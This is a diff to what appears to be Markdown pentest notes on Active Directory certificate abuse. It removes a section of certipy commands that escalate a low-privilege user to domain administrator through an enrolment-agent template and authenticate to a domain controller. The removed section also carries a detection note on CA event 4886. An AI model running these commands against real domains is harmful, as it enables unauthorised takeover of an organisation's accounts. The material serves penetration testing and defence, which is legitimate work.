@@ -30,21 +30,3 @@ flowchart TD
 
 ### Commands
 ```bash
-# ── Step 1 — obtain agent certificate ───────────────────────────────
-certipy req -u lowpriv@corp.local -p 'Password123!' \
-  -ca CORP-CA -template AgentTemplate
-
-# ── Step 2 — request on behalf of administrator ──────────────────────
-certipy req -u lowpriv@corp.local -p 'Password123!' \
-  -ca CORP-CA -template User \
-  -on-behalf-of 'CORP\administrator' \
-  -pfx agent.pfx
-
-# ── Authenticate ─────────────────────────────────────────────────────
-certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
-```
-
-### Detection
-**4886** with **`RequesterName` ≠ `Subject`** (on-behalf-of) in the CA log. Restrict agent templates to enrolment agents.
-
----
